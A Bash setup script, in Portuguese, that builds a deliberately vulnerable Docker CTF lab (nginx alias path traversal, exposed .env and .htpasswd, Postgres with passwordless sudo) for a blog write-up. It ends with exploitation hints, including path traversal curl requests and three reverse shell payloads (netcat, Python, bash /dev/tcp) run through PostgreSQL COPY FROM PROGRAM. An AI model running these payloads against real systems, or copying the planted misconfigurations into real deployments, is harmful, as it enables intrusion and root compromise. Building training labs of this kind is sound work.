#!/bin/bash

# Script de setup automático para CTF Path Traversal
# Este script configura todo o ambiente para replicar exatamente o cenário do artigo
# Link do artigo: https://sandsoncosta.github.io/blog/ctf-de-um-path-traversal-ao-acesso-root/
# Autor: Sandson Costa
# Linkedin: https://www.linkedin.com/in/sandsoncosta/

set -e

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Função para print colorido
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[!]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[*]${NC} $1"
}

print_info() {
    echo -e "${BLUE}[i]${NC} $1"
}

print_header() {
    echo -e "${WHITE}[=]${NC} $1"
}

echo -e "${CYAN}===   CTF Path Traversal - Setup Automático   ===${NC}"
echo -e "${CYAN}===      Script criado por: Sandson Costa     ===${NC}"
echo -e "${CYAN}=== https://www.linkedin.com/in/sandsoncosta/ ===${NC}"
echo ""
echo -e "${RED}===         Executar o script como sudo        ===${NC}"
echo ""

# Verificar se Docker e Docker Compose estão instalados
if ! command -v docker &> /dev/null; then
    print_error "Docker não está instalado!"
    exit 1
fi

if ! command -v docker-compose &> /dev/null; then
    print_error "Docker Compose não está instalado!"
    exit 1
fi

print_status "Docker e Docker Compose encontrados"

# Limpar containers existentes se houver
print_info "Limpando ambiente anterior..."
docker-compose down &> /dev/null || true
docker volume rm $(docker volume ls -q | grep ctf) &> /dev/null || true

# Criar estrutura de diretórios
print_info "Criando estrutura de diretórios..."
rm -rf nginx apache html login postgres
mkdir -p nginx apache/html apache/Chibi html login postgres

# Configuração do Nginx
print_info "Configurando Nginx..."
cat > nginx/nginx.conf << 'EOF'
user  nginx;
worker_processes  1;

error_log  /var/log/nginx/error.log warn;
pid        /var/run/nginx.pid;

events {
    worker_connections  1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;
    keepalive_timeout  65;

    include /etc/nginx/conf.d/*.conf;
}
EOF

cat > nginx/default.conf << 'EOF'
server {
    listen 80;
    server_name ~^(.+)$;
    root /etc/nginx;

    location / {
        if (!-f $request_filename) {
            return 301 /tshirt;
        }
        
    }

    location /tshirt {
        alias /usr/share/nginx/html/;
    }
    
    location /image {
        proxy_pass http://apache:80/Chibi/;
    }
    

    location /login/ {
        auth_basic "Authetication Required";
        auth_basic_user_file /etc/nginx/.htpasswd;
        alias /usr/share/login/;
    }
}
EOF

# Criar arquivo .htpasswd
print_info "Criando credenciais..."
echo "threat:{PLAIN}JustaLittleCTFLab" > nginx/.htpasswd

# Configuração da página principal (T-Shirts)
print_info "Criando página principal..."
cat > html/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Xtr T-Shirts</title>
    <style>
.carousel {
    width: 100%;
    height: 800px;
    position: relative;
    overflow: hidden;
}

.carousel-image {
    display: none;
    position: absolute;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
    width: 1024px;
  height: 800px;
  object-fit: contain;
}

a {
    text-decoration: none;
    color: blue;
}

 </style>
</head>
<body>
    <h1 style="text-align: center;">T-Shirts Xtr</h1>
<div class="carousel">
    <img class="carousel-image" src="/image/1.jpg">
    <img class="carousel-image" src="/image/2.jpg">
    <img class="carousel-image" src="/image/3.jpg">
    <img class="carousel-image" src="/image/4.jpg">
</div>

<br><br><br>
<!-- <a href="/login/">Login</a> -->
<br>
<script >
const carouselImages = document.querySelectorAll('.carousel-image');
let currentIndex = 0;

function showImage(index) {
    carouselImages.forEach((image, i) => {
        if (i === index) {
            image.style.display = 'block';
        } else {
            image.style.display = 'none';
        }
    });
}

function nextImage() {
    currentIndex++;
    if (currentIndex >= carouselImages.length) {
        currentIndex = 0;
    }
    showImage(currentIndex);
}

function previousImage() {
    currentIndex--;
    if (currentIndex < 0) {
        currentIndex = carouselImages.length - 1;
    }
    showImage(currentIndex);
}

document.addEventListener('DOMContentLoaded', () => {
    showImage(currentIndex);
    setInterval(nextImage, 5000);
});
</script>
</body>
</html>
EOF

# Configuração da página de login
print_info "Criando página de login..."
cat > login/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>User Logged In</title>
</head>
<body>
    <h1>Welcome, threat!</h1>
    <p>You are logged in.</p>
    <h6>FLAG1{linkedin.com/in/sandsoncosta}</h6>
    <p>There are more three flags: local.txt,.env and proof.txt</p>
</body>
</html>
EOF

# Configuração do Apache
print_info "Configurando Apache..."
cat > apache/html/index.html << 'EOF'
<html><body><h1>It works!</h1></body></html>
EOF

# Criar diretório Chibi se não existir
mkdir -p apache/Chibi

# Baixar imagens aleatórias da internet para o diretório Chibi
print_info "Baixando imagens aleatórias..."
curl -sL -o apache/Chibi/1.jpg "https://picsum.photos/500/500?random=1" &> /dev/null || print_warning "Falha ao baixar imagem 1"
curl -sL -o apache/Chibi/2.jpg "https://picsum.photos/500/500?random=2" &> /dev/null || print_warning "Falha ao baixar imagem 2"
curl -sL -o apache/Chibi/3.jpg "https://picsum.photos/500/500?random=3" &> /dev/null || print_warning "Falha ao baixar imagem 3"
curl -sL -o apache/Chibi/4.jpg "https://picsum.photos/500/500?random=4" &> /dev/null || print_warning "Falha ao baixar imagem 4"

# Criar arquivo .env com a flag
cat > apache/html/.env << 'EOF'
DB_PASSWORD=DontBrotherMe_CrackMeIfYouCan
DB_USER=postgres
DB_NAME=tshirts
DB_HOST=db

SERVER_PORT=8080
SERVER_TIMEOUT=300

FLAG3{linkedin.com/in/sandsoncosta}
EOF

# Criar arquivo local.txt
echo "FLAG2{linkedin.com/in/sandsoncosta}" > html/local.txt

# Configuração do PostgreSQL
print_info "Configurando PostgreSQL..."
cat > postgres/init.sql << 'EOF'
-- Script de inicialização do PostgreSQL
-- Configurar usuário postgres com sudo
-- Isso permitirá escalação de privilégios

-- Criar estrutura básica para simular ambiente real
CREATE TABLE IF NOT EXISTS tshirts (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100),
    description TEXT,
    price DECIMAL(10,2)
);

-- Inserir dados de exemplo
INSERT INTO tshirts (name, description, price) VALUES 
('T-Shirt Básica', 'Camiseta básica 100% algodão', 29.90),
('T-Shirt Premium', 'Camiseta premium com estampa exclusiva', 49.90),
('T-Shirt Gamer', 'Camiseta para gamers', 39.90);
EOF

# Criar Dockerfile personalizado para PostgreSQL com ferramentas adicionais
print_info "Criando Dockerfile personalizado para PostgreSQL..."
cat > postgres/Dockerfile << 'EOF'
FROM postgres:13

# Instalar ferramentas essenciais para reverse shell
USER root

# Atualizar repositórios e instalar pacotes
RUN apt-get update && apt-get install -y \
    netcat-traditional \
    python3 \
    python3-pip \
    curl \
    wget \
    sudo \
    vim \
    nano \
    && rm -rf /var/lib/apt/lists/*

# Criar link simbólico para nc (algumas distros usam nomes diferentes)
RUN ln -sf /bin/nc.traditional /bin/nc

# Configurar sudo para postgres (simulando escalação de privilégios)
RUN echo 'postgres ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers

# GARANTIR que o diretório /root existe e criar a flag DIRETO NO BUILD
RUN echo "FLAG4{linkedin.com/in/sandsoncosta}" > /root/proof.txt && chmod 600 /root/proof.txt

# Voltar para usuário postgres
USER postgres
EOF

# Criar docker-compose.yml
print_info "Criando docker-compose.yml..."
cat > docker-compose.yml << 'EOF'
version: '3.8'

services:
  nginx:
    image: nginx:alpine
    container_name: ctf_nginx
    ports:
      - "80:80"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf
      - ./nginx/default.conf:/etc/nginx/conf.d/default.conf
      - ./nginx/.htpasswd:/etc/nginx/.htpasswd
      - ./html:/usr/share/nginx/html
      - ./login:/usr/share/login
    depends_on:
      - apache
    networks:
      - ctf_network

  apache:
    image: httpd:2.4
    container_name: ctf_apache
    ports:
      - "8080:80"
    volumes:
      - ./apache/html:/usr/local/apache2/htdocs
      - ./apache/Chibi:/usr/local/apache2/htdocs/Chibi
    networks:
      - ctf_network

  postgres:
    build:
      context: ./postgres
      dockerfile: Dockerfile
    container_name: ctf_postgres
    environment:
      POSTGRES_PASSWORD: DontBrotherMe_CrackMeIfYouCan
      POSTGRES_USER: postgres
      POSTGRES_DB: tshirts
    ports:
      - "5432:5432"
    volumes:
      - ./postgres:/docker-entrypoint-initdb.d
      - postgres_data:/var/lib/postgresql/data
    networks:
      - ctf_network

networks:
  ctf_network:
    driver: bridge

volumes:
  postgres_data:
EOF

# Subir os containers
print_info "Construindo e iniciando containers..."

if ! docker-compose build; then
    print_error "Falha ao construir containers!"
    exit 1
fi

if ! docker-compose up -d; then
    print_error "Falha ao iniciar containers!"
    exit 1
fi

# Aguardar containers iniciarem
print_warning "Esperando containers subirem..."
sleep 30

# GARANTIR CRIAÇÃO DO ARQUIVO PROOF.TXT APÓS OS CONTAINERS SUBIREM
print_info "Garantindo que proof.txt seja criado..."

# Primeira tentativa: verificar se já existe
if docker exec -u root ctf_postgres test -f /root/proof.txt &> /dev/null; then
    print_status "proof.txt já existe no container"
else
    print_warning "proof.txt não encontrado, criando..."
    
    # Forçar criação do arquivo
    docker exec -u root ctf_postgres bash -c 'echo "FLAG4{linkedin.com/in/sandsoncosta}" > /root/proof.txt && chmod 600 /root/proof.txt'
    
    # Verificar novamente
    if docker exec -u root ctf_postgres test -f /root/proof.txt &> /dev/null; then
        print_status "proof.txt criado com sucesso!"
    else
        print_error "FALHA: Não foi possível criar proof.txt"
        exit 1
    fi
fi

# Verificar o conteúdo para garantir
FLAG_CONTENT=$(docker exec -u root ctf_postgres cat /root/proof.txt 2>/dev/null || echo "ERRO")
if [[ "$FLAG_CONTENT" == "FLAG4{linkedin.com/in/sandsoncosta}" ]]; then
    print_status "Conteúdo de proof.txt verificado e correto"
else
    print_error "FALHA: Conteúdo de proof.txt incorreto: $FLAG_CONTENT"
    # Corrigir o conteúdo
    docker exec -u root ctf_postgres bash -c 'echo "FLAG4{linkedin.com/in/sandsoncosta}" > /root/proof.txt'
    print_status "Conteúdo de proof.txt corrigido"
fi

# Verificar se os serviços estão rodando
echo ""
print_header "Verificando serviços..."
if curl -sL http://localhost &> /dev/null; then
    print_status "Nginx está rodando"
else
    print_error "Nginx não está respondendo"
fi

if docker exec ctf_postgres pg_isready -U postgres &> /dev/null; then
    print_status "PostgreSQL está rodando"
else
    print_error "PostgreSQL não está respondendo"
fi

if docker exec ctf_apache httpd -v &> /dev/null; then
    print_status "Apache está rodando"
else
    print_error "Apache não está respondendo"
fi

# Testar se as ferramentas estão instaladas
print_header "Verificando ferramentas instaladas no PostgreSQL..."
if docker exec ctf_postgres which nc &> /dev/null; then
    print_status "Netcat está instalado"
else
    print_error "Netcat não foi instalado corretamente"
fi

if docker exec ctf_postgres which python3 &> /dev/null; then
    print_status "Python3 está instalado"
else
    print_error "Python3 não foi instalado corretamente"
fi

# Verificar se sudo está configurado
if docker exec ctf_postgres sudo -l &> /dev/null; then
    print_status "Sudo está configurado para postgres"
else
    print_warning "Sudo pode não estar configurado corretamente"
fi

# VERIFICAÇÃO FINAL GARANTIDA DA FLAG
print_header "VERIFICAÇÃO FINAL DA FLAG 4..."
FINAL_CHECK=$(docker exec -u root ctf_postgres cat /root/proof.txt 2>/dev/null || echo "FALHA")
if [[ "$FINAL_CHECK" == "FLAG4{linkedin.com/in/sandsoncosta}" ]]; then
    print_status "✓ FLAG 4 CONFIRMADA: /root/proof.txt existe e contém o conteúdo correto"
else
    print_error "✗ PROBLEMA COM FLAG 4!"
    exit 1
fi

echo ""
echo -e "${GREEN}[+] Lab completo!${NC}"
echo ""
echo -e "${CYAN}=== INFORMAÇÕES DO AMBIENTE ===${NC}"
echo -e "${BLUE}[i]${NC} URL Principal: http://localhost/"
echo -e "${BLUE}[i]${NC} Credenciais: threat:JustaLittleCTFLab"
echo -e "${BLUE}[i]${NC} PostgreSQL: localhost:5432"
echo -e "    Usuário: postgres"
echo -e "    Senha: DontBrotherMe_CrackMeIfYouCan"
echo ""
echo -e "${PURPLE}=== FLAGS DISPONÍVEIS ===${NC}"
echo -e "${YELLOW}[*]${NC} Flag 1 (Login): FLAG1{linkedin.com/in/sandsoncosta}"
echo -e "${YELLOW}[*]${NC} Flag 2 (local.txt): FLAG2{linkedin.com/in/sandsoncosta}"
echo -e "${YELLOW}[*]${NC} Flag 3 (.env): FLAG3{linkedin.com/in/sandsoncosta}"
echo -e "${YELLOW}[*]${NC} Flag 4 (proof.txt): FLAG4{linkedin.com/in/sandsoncosta} - em /root/proof.txt ✓ CONFIRMADA"
echo ""
echo -e "${RED}=== VULNERABILIDADES PARA EXPLORAR ===${NC}"
echo -e "${RED}[!]${NC} Path Traversal via /image../"
echo -e "${RED}[!]${NC} Directory Listing em /image/"
echo -e "${RED}[!]${NC} Arquivos expostos: .htpasswd, nginx.conf"
echo -e "${RED}[!]${NC} PostgreSQL com escalação de privilégios"
echo ""
echo -e "${GREEN}=== COMANDOS ÚTEIS ===${NC}"
echo -e "${GREEN}[+]${NC} Ver logs: docker-compose logs -f [nginx|apache|postgres]"
echo -e "${GREEN}[+]${NC} Reiniciar: docker-compose restart"
echo -e "${GREEN}[+]${NC} Parar: docker-compose down"
echo -e "${GREEN}[+]${NC} Shell no container: docker exec -it [ctf_nginx|ctf_apache|ctf_postgres] bash"
echo ""
echo -e "${WHITE}=== EXPLORAÇÃO ===${NC}"
echo -e "${WHITE}[=]${NC} 1. Acesse http://localhost/ e explore a aplicação"
echo -e "${WHITE}[=]${NC} 2. Teste Path Traversal: curl 'http://localhost/image../.env'"
echo -e "${WHITE}[=]${NC} 3. Acesse PostgreSQL: psql -h localhost -U postgres -d tshirts"
echo -e "${WHITE}[=]${NC} 4. Escalar privilégios via PostgreSQL para obter /root/proof.txt"
echo ""
echo -e "${BLUE}=== DESCOBRIR SEU IP ===${NC}"
echo -e "${BLUE}[i]${NC} ip addr show | grep inet"
echo -e "${BLUE}[i]${NC} hostname -I"
echo -e "${BLUE}[i]${NC} ifconfig (se disponível)"
echo ""
echo -e "${CYAN}Para conectar via netcat após escalação:${NC}"
echo -e "nc -lvnp 4444"
echo ""
echo -e "${CYAN}Dentro do PostgreSQL, execute:${NC}"
echo -e "DROP TABLE IF EXISTS shell_out;"
echo -e "CREATE TABLE shell_out(cmd_output text);"
echo ""
echo -e "${GREEN}=== REVERSE SHELLS QUE FUNCIONAM ===${NC}"
echo -e "${GREEN}[+]${NC} Netcat tradicional:"
echo -e "COPY shell_out FROM PROGRAM 'nc -e /bin/bash SEU_IP 4444';"
echo ""
echo -e "${GREEN}[+]${NC} Python3:"
echo -e "COPY shell_out FROM PROGRAM 'python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"SEU_IP\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/bash\\\"])\"';"
echo ""
echo -e "${GREEN}[+]${NC} Bash TCP:"
echo -e "COPY shell_out FROM PROGRAM 'bash -c \"/bin/bash -i > /dev/tcp/SEU_IP/4444 0<&1 2>&1\"';"
echo ""
echo -e "${YELLOW}[*] Substitua SEU_IP pelo seu IP real!${NC}"
echo ""
echo -e "${CYAN}=== TESTE DE EXPLORAÇÃO ===${NC}"
echo -e "curl 'http://localhost/image../.env'"
echo -e "curl 'http://localhost/image../.htpasswd'"
echo -e "curl 'http://localhost/image../nginx.conf'"
echo ""
echo -e "${GREEN}✓ SETUP COMPLETO - FLAG 4 GARANTIDA EM /root/proof.txt${NC}"
